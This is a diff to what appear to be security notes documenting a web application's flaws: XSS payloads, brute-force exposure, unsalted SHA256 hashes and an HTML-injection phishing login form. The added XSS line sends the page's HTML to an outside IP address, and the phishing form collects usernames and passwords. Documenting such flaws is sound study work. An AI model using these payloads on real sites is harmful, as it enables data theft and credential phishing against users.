@@ -16,6 +16,7 @@ https://www.youtube.com/watch?v=T0vxdqvW9fU&list=LL&index=3
 <script>alert(document.cookie); </script>
 <img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
 <IMG SRC=j&#X41vascript:alert('test2')>
+<script>new Image().src="https://192.165.159.122/fakepg.php?output="+document.body.innerHTML</script>
 ```
 
 # Brute-force attack
@@ -25,10 +26,14 @@ Is possible because we do not check how many requests have been sent by one user
 Möglich wegen veraltetem Hashalgorythmus (SHA256) und weil kein Salt verwendet wird sind alle hashes deterministisch 
 
 # HTML Injections
+(Phishing)
 ```html
 <h3>Please login to proceed</h3>
-<form action=http://192.165.159.122>Username:<br>
-<input type="username" name="username"></br>Password:<br>
-<input type="password" name="password"></br><br>
+<form action=http://www.google.com>
+Username:<br>
+<input type="username" name="username"></br>
+Password:<br>
+<input type="password" name="password"></br>
+<br>
 <input type="submit" value="Login"></br>
 ```
